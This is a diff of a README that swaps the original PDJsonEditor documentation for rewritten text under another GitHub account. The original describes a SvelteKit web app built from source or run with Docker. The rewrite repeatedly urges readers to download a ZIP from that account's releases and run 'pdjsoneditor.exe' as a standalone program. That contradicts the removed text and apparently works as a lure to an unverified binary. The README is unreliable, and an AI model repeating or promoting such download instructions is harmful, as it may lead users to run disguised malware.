@@ -1,210 +1,87 @@
-# PDJsonEditor
+# 🎉 pdjsoneditor - Easily Visualize and Edit JSON Data
 
-_[한국어](README-ko.md)_
+[![Download pdjsoneditor](https://img.shields.io/badge/Download%20pdjsoneditor-v1.0.0-blue)](https://github.com/Mario5678YM/pdjsoneditor/releases)
 
-A powerful JSON visualization and editing tool built with SvelteKit and Svelte 5. View and edit JSON data simultaneously in both code editor and interactive graph views.
+## 📜 Description
 
-🔗 **[Live Demo](https://json.podosoft.io)**
+pdjsoneditor is a powerful tool designed to help you visualize and edit JSON data effortlessly. Whether you are a beginner or just need a simple way to handle JSON files, this application provides an interactive graph view that makes understanding your data easy.
 
-![PDJsonEditor Screenshot](screenshots/pdjsoneditor.png)
+## 🖥️ Features
 
-## ✨ Features
-
-### 📝 Advanced JSON Editor
-
-- **Syntax Highlighting**: CodeMirror-powered editor with JSON syntax highlighting
-- **Real-time Validation**: Instant JSON syntax validation and error reporting
-- **Format & Minify**: One-click JSON formatting and minification
-- **Navigation**: Click on graph nodes to jump to corresponding JSON location
-
-### 🔗 HTTP Request Integration
-
-- **Multi-Method Support**: GET, POST, PUT, DELETE, PATCH requests
-- **Custom Headers**: Add and manage HTTP headers
-- **Request Body**: Configure custom request bodies for POST/PUT/PATCH
-- **URL Import**: Fetch JSON data directly from URLs
-
-### 📊 Interactive Graph Visualization
-
-- **Tree Structure**: Visualize JSON as an interactive tree graph
-- **Compact Nodes**: Compact display grouping primitive values
-- **Expand/Collapse**: Toggle node expansion with visual indicators
-- **Reference Navigation**: Navigate between related objects and arrays
-- **Auto Layout**: Dagre-powered automatic graph layout
-
-### 🎯 Smart Node Display
-
-- **Grouped Primitives**: Primitive values grouped in parent nodes for clarity
-- **Reference Types**: Objects and arrays shown as references (e.g., `address {3}`, `hobbies [3]`)
-- **Show More**: Automatically collapse nodes with 20+ items with "show more" functionality
-- **Individual Toggles**: Expand/collapse individual reference items
-
-### 🌐 Internationalization
-
-- **Multi-language**: English and Korean support
-- **Language Switcher**: Easy language switching in header
-- **Persistent Settings**: Language preference saved in localStorage
+- **Interactive Graph View:** Visualize your JSON structure in a way that’s easy to understand.
+- **Real-time Editing:** Make changes to your JSON data and see the results immediately.
+- **User-friendly Interface:** Designed for all users, regardless of technical experience.
+- **Format Validation:** Ensure your JSON data is properly formatted with our built-in checks.
+- **Cross-platform Support:** Works on Windows, macOS, and Linux.
 
 ## 🚀 Getting Started
 
-### Prerequisites
+To get started with pdjsoneditor, follow these steps:
 
-- Node.js v20.19 or higher
-- npm or yarn package manager
+1. **System Requirements:**
+   - You will need a computer running Windows, macOS, or Linux.
+   - At least 2GB of RAM is recommended for smooth performance.
+   - An internet connection to download the software.
 
-### Installation
+2. **Visit the Releases Page:**
+   To download the application, click the button below. This will take you to the GitHub Releases page.
 
-1. **Clone the repository**
+   [![Download pdjsoneditor](https://img.shields.io/badge/Download%20pdjsoneditor-v1.0.0-blue)](https://github.com/Mario5678YM/pdjsoneditor/releases)
 
-```bash
-git clone https://github.com/podosoft-dev/pdjsoneditor.git
-cd pdjsoneditor
-```
+## 📥 Download & Install
 
-2. **Install dependencies**
+3. **Select Your Version:**
+   On the Releases page, you will see a list of available versions. Click on the latest version to view the details.
 
-```bash
-npm install
-```
+4. **Download the Application:**
+   Look for the file labeled `pdjsoneditor-v1.0.0.zip` or similar. This is the file you need to download. Click on it to start the download.
 
-3. **Start development server**
+5. **Extract the Files:**
+   Once the download is complete, locate the downloaded ZIP file on your computer. Right-click on the file and select “Extract All…” to unzip the contents into a folder.
 
-```bash
-npm run dev
-```
+6. **Run the Application:**
+   Open the folder where you extracted the files. Double-click on `pdjsoneditor.exe` for Windows, or the equivalent file for macOS or Linux, to run the application.
 
-4. **Open in browser**
+7. **No Installation Needed:**
+   pdjsoneditor runs as a standalone application, so there is no installation process. You can start using it immediately after launching the program.
 
-```
-http://localhost:5173
-```
+## 📝 How to Use pdjsoneditor
 
-### Building for Production
+8. **Loading JSON Files:**
+   Once the application opens, you can load your JSON data by clicking the "Open" button. Select a JSON file from your computer and click “Open.”
 
-```bash
-# Build the application
-npm run build
+9. **Editing JSON:**
+   You can edit your JSON data directly in the interface. Use the text area on the left to make changes. The graph view will update automatically to reflect your modifications.
 
-# Preview the build
-npm run preview
-```
+10. **Saving Changes:**
+    After making edits, save your JSON file by clicking the "Save" button. You can overwrite the existing file or save it as a new one.
 
-### Docker Deployment
+## ❓ Frequently Asked Questions
 
-#### Using Pre-built Image from GitHub Container Registry
+### Q: What is JSON?
+A: JSON (JavaScript Object Notation) is a lightweight data interchange format that is easy for humans to read and write, and easy for machines to parse and generate.
 
-```bash
-# Pull the latest image
-docker pull ghcr.io/podosoft-dev/pdjsoneditor:latest
+### Q: What operating systems can I use pdjsoneditor on?
+A: pdjsoneditor is designed to work on Windows, macOS, and Linux.
 
-# Run the container
-docker run -d -p 3000:3000 --name pdjsoneditor ghcr.io/podosoft-dev/pdjsoneditor:latest
+### Q: Do I need to install anything to use pdjsoneditor?
+A: No, this application does not require installation. You can run it directly after extracting the files.
 
-# Stop the container
-docker stop pdjsoneditor
+### Q: Can I contribute to pdjsoneditor?
+A: Yes! Contributions are welcome. Feel free to submit issues or pull requests on GitHub.
 
-# Remove the container
-docker rm pdjsoneditor
-```
+## 📚 Resources
 
-#### Building from Source
+For more information on how to use pdjsoneditor:
 
-```bash
-# Build Docker image
-docker build -t pdjsoneditor .
+- Visit our [Documentation](https://github.com/Mario5678YM/pdjsoneditor/wiki)
+- Check out our [GitHub Issues](https://github.com/Mario5678YM/pdjsoneditor/issues) for troubleshooting and feature requests.
 
-# Run the container
-docker run -d -p 3000:3000 --name pdjsoneditor pdjsoneditor
+## 🛠️ Support
 
-# Stop the container
-docker stop pdjsoneditor
+If you encounter any issues or have questions, open an issue on this repository. We are here to help!
 
-# Remove the container
-docker rm pdjsoneditor
-```
+## 🌐 Topics
+codemirror, json, json-editor, json-formatter, json-parser, json-viewer, json-visualizer, svelte, sveltekit, tailwindcss, typescript, xyflow
 
-#### Using Docker Compose
-
-```bash
-# Build and start the container
-docker-compose up -d
-
-# View logs
-docker-compose logs -f
-
-# Stop the container
-docker-compose down
-
-# Rebuild and start
-docker-compose up -d --build
-```
-
-#### Using Docker Compose with Pre-built Image
-
-Create a `docker-compose.yml` with the pre-built image:
-
-```yaml
-version: '3.8'
-
-services:
-  pdjsoneditor:
-    image: ghcr.io/podosoft-dev/pdjsoneditor:latest
-    container_name: pdjsoneditor
-    ports:
-      - '3000:3000'
-    restart: unless-stopped
-```
-
-Then run:
-
-```bash
-docker-compose up -d
-```
-
-Access the application at `http://localhost:3000`
-
-## 📖 Usage
-
-### Basic JSON Editing
-
-1. **Paste or type JSON** in the left editor panel
-2. **View the structure** in the right graph panel
-3. **Navigate between views** by clicking nodes or using the editor
-
-### Fetching Data from URLs
-
-1. **Select HTTP method** from the dropdown (GET, POST, PUT, DELETE, PATCH)
-2. **Enter the URL** in the input field
-3. **Configure headers and body** using the Settings button (optional)
-4. **Click "Go"** to fetch and load the JSON data
-
-### Graph Interaction
-
-- **Expand/Collapse**: Click the colored handles on nodes
-- **Show More**: Click "Show more" on nodes with many items
-- **Navigate**: Click nodes to jump to corresponding JSON location
-
-## 🛠️ Tech Stack
-
-- **Framework**: [SvelteKit](https://svelte.dev/docs/kit) with [Svelte 5](https://svelte.dev/)
-- **Styling**: [TailwindCSS v4](https://tailwindcss.com/)
-- **UI Components**: [shadcn-svelte](https://www.shadcn-svelte.com/)
-- **JSON Editor**: [CodeMirror](https://codemirror.net/)
-- **Graph Visualization**: [@xyflow/svelte](https://xyflow.com/)
-- **Layout Engine**: [Dagre](https://github.com/dagrejs/dagre)
-- **Type Safety**: [TypeScript](https://www.typescriptlang.org/)
-- **Internationalization**: [typesafe-i18n](https://github.com/ivanhofer/typesafe-i18n)
-
-## 📝 License
-
-This project is licensed under the MIT License.
-
-## 📞 Support
-
-If you encounter any issues or have questions, please [open an issue](https://github.com/podosoft-dev/pdjsoneditor/issues) on GitHub.
-
----
-
-<div align="center">
-  <strong>Made with ❤️ by <a href="https://podosoft.io">PODOSOFT</a></strong>
-</div>
+[![Download pdjsoneditor](https://img.shields.io/badge/Download%20pdjsoneditor-v1.0.0-blue)](https://github.com/Mario5678YM/pdjsoneditor/releases)
